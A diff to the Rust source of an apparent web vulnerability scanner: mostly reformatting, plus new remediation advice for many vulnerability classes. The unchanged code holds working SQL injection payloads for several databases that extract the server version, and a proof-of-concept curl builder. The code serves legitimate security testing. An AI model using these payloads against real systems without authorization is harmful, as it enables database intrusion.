@@ -10,13 +10,22 @@ pub fn grade(finding: &Finding) -> Confidence {
     }
     let text = format!("{} {}", finding.title, finding.detail).to_lowercase();
     let tentative_words = [
-        "possible", "behaviour change", "behavior change", "widened", "verify",
-        "heuristic", "suspicious", "worth confirming", "may", "surface",
+        "possible",
+        "behaviour change",
+        "behavior change",
+        "widened",
+        "verify",
+        "heuristic",
+        "suspicious",
+        "worth confirming",
+        "may",
+        "surface",
     ];
     // word-boundaried check for "surface" so "surfaced" doesn't match
     let is_tentative = tentative_words.iter().any(|w| {
         if *w == "surface" || *w == "may" {
-            text.split_whitespace().any(|word| word.trim_matches(|c: char| !c.is_alphanumeric()) == *w)
+            text.split_whitespace()
+                .any(|word| word.trim_matches(|c: char| !c.is_alphanumeric()) == *w)
         } else {
             text.contains(w)
         }
@@ -25,9 +34,18 @@ pub fn grade(finding: &Finding) -> Confidence {
         return Confidence::Tentative;
     }
     let confirmed_words = [
-        "error-based", "time-based", "in-band", "evaluated", "reflected",
-        "confirmed", "read /etc", "external entity", "introspection",
-        "alg=none", "enabled", "exposed",
+        "error-based",
+        "time-based",
+        "in-band",
+        "evaluated",
+        "reflected",
+        "confirmed",
+        "read /etc",
+        "external entity",
+        "introspection",
+        "alg=none",
+        "enabled",
+        "exposed",
     ];
     if confirmed_words.iter().any(|w| text.contains(w)) {
         return Confidence::Confirmed;
@@ -39,7 +57,11 @@ pub fn poc_curl(finding: &Finding, headers: &HashMap<String, String>) -> String 
     if finding.url.is_empty() || finding.param.is_empty() {
         return String::new();
     }
-    let payload = if finding.payload.is_empty() { "FUZZ" } else { &finding.payload };
+    let payload = if finding.payload.is_empty() {
+        "FUZZ"
+    } else {
+        &finding.payload
+    };
     let mut hdr = String::new();
     for (k, v) in headers {
         let lk = k.to_lowercase();
@@ -72,7 +94,9 @@ fn urlencode(s: &str) -> String {
     let mut out = String::new();
     for b in s.bytes() {
         match b {
-            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(b as char)
+            }
             _ => out.push_str(&format!("%{b:02X}")),
         }
     }
@@ -80,19 +104,47 @@ fn urlencode(s: &str) -> String {
 }
 
 const SQLI_EXTRACT: &[(&str, &str, &str)] = &[
-    ("MySQL/MariaDB extractvalue", "{b}' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -", r"~([\w.\-+]+)~?"),
-    ("MySQL/MariaDB updatexml", "{b}' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -", r"~([\w.\-+]+)~?"),
-    ("PostgreSQL cast error", "{b}' AND 1=CAST(version() AS int)-- -", r#"(PostgreSQL [\d.]+[^\s"'<]*)"#),
-    ("MSSQL convert error", "{b}' AND 1=CONVERT(int,@@version)-- -", r"(Microsoft SQL Server[^<\n\x22']{0,60})"),
-    ("SQLite", "{b}' AND 1=likelihood(sqlite_version(),1)-- -", r"(\d+\.\d+\.\d+)"),
-    ("UNION version", "{b}' UNION SELECT sqlite_version()-- -", r"(\d+\.\d+\.\d+)"),
+    (
+        "MySQL/MariaDB extractvalue",
+        "{b}' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
+        r"~([\w.\-+]+)~?",
+    ),
+    (
+        "MySQL/MariaDB updatexml",
+        "{b}' AND updatexml(1,concat(0x7e,version(),0x7e),1)-- -",
+        r"~([\w.\-+]+)~?",
+    ),
+    (
+        "PostgreSQL cast error",
+        "{b}' AND 1=CAST(version() AS int)-- -",
+        r#"(PostgreSQL [\d.]+[^\s"'<]*)"#,
+    ),
+    (
+        "MSSQL convert error",
+        "{b}' AND 1=CONVERT(int,@@version)-- -",
+        r"(Microsoft SQL Server[^<\n\x22']{0,60})",
+    ),
+    (
+        "SQLite",
+        "{b}' AND 1=likelihood(sqlite_version(),1)-- -",
+        r"(\d+\.\d+\.\d+)",
+    ),
+    (
+        "UNION version",
+        "{b}' UNION SELECT sqlite_version()-- -",
+        r"(\d+\.\d+\.\d+)",
+    ),
 ];
 
 pub fn extract_sqli<F>(send: F, base_value: &str) -> String
 where
     F: Fn(&str) -> String,
 {
-    let b = if base_value.is_empty() { "1" } else { base_value };
+    let b = if base_value.is_empty() {
+        "1"
+    } else {
+        base_value
+    };
     for (label, tmpl, pattern) in SQLI_EXTRACT {
         let payload = tmpl.replace("{b}", b);
         let body = send(&payload);
@@ -139,6 +191,18 @@ pub fn remediation_for(check_name: &str) -> &'static str {
         "recon" => "Suppress version banners; disable unneeded HTTP methods; keep TLS modern.",
         "auth_bruteforce" => "Add rate limiting + lockout/CAPTCHA and uniform error messages to prevent enumeration.",
         "files" => "Remove or block access to exposed sensitive files; disable directory listing.",
+        "api_docs" => "Serve API documentation only to authenticated users or from internal networks; publish sanitized public docs without internal endpoints.",
+        "debug_endpoints" => "Disable diagnostic endpoints (actuators, pprof, phpinfo, server-status) in production or bind them to an internal interface behind auth.",
+        "hpp" => "Normalize parameters before use: define one server-side precedence for duplicates and reject requests whose repeated params disagree.",
+        "log4shell" => "Upgrade log4j2 to >= 2.17.1 (or remove JndiLookup via -Dlog4j2.formatMsgNoLookups=true on 2.10+); never log user-controlled data with a vulnerable version.",
+        "blind_oob" => "Egress-filter server-side requests to an allow-list; block link-local/metadata ranges; encode untrusted data before storing or rendering it.",
+        "external" => "Triage each external-tool finding against this toolkit's evidence and fix the underlying class per its remediation.",
+        "deserialize" => "Never deserialize untrusted data. Prefer JSON over native formats; if unavoidable, add strict type allow-lists (Java: validate with a look-ahead ObjectInputFilter; .NET: disable TypeNameHandling; PHP: never unserialize() user input).",
+        "dom_xss" => "Assign untrusted client data only via textContent/createTextNode; audit innerHTML/document.write sinks and add a strict Content-Security-Policy as a backstop.",
+        "race_condition" => "Guard state-changing operations with transactional reads-and-writes, row locks (SELECT ... FOR UPDATE), or idempotency keys; never check-then-act outside a transaction.",
+        "request_smuggling" => "Make front- and back-ends agree on framing (normalize Transfer-Encoding end-to-end, forbid both headers on one request), use HTTP/2 internally, and reject conflicting/duplicate Content-Length with 400.",
+        "tls_enum" => "Disable TLS 1.0/1.1 server-side; require TLS 1.2+ (prefer TLS 1.3) with a modern cipher-suite policy.",
+        "business_logic" => "Validate every input against an explicit domain (type, range, sign) server-side; clamp values and reject out-of-domain input instead of trusting the client.",
         "cve-match" => "Upgrade the affected component to a fixed version.",
         _ => "",
     }
@@ -158,19 +222,34 @@ mod tests {
 
     #[test]
     fn grade_returns_tentative_for_hedged_language() {
-        let f = Finding::new("idor", Severity::Medium, "Possible IDOR", "worth confirming manually");
+        let f = Finding::new(
+            "idor",
+            Severity::Medium,
+            "Possible IDOR",
+            "worth confirming manually",
+        );
         assert_eq!(grade(&f), Confidence::Tentative);
     }
 
     #[test]
     fn grade_does_not_treat_surfaced_as_surface() {
-        let f = Finding::new("sqli", Severity::Critical, "Error-based SQL injection", "payload surfaced a DB error");
+        let f = Finding::new(
+            "sqli",
+            Severity::Critical,
+            "Error-based SQL injection",
+            "payload surfaced a DB error",
+        );
         assert_eq!(grade(&f), Confidence::Confirmed);
     }
 
     #[test]
     fn grade_falls_back_to_firm() {
-        let f = Finding::new("headers", Severity::Medium, "Missing X-Frame-Options", "no clickjacking protection");
+        let f = Finding::new(
+            "headers",
+            Severity::Medium,
+            "Missing X-Frame-Options",
+            "no clickjacking protection",
+        );
         assert_eq!(grade(&f), Confidence::Firm);
     }
 
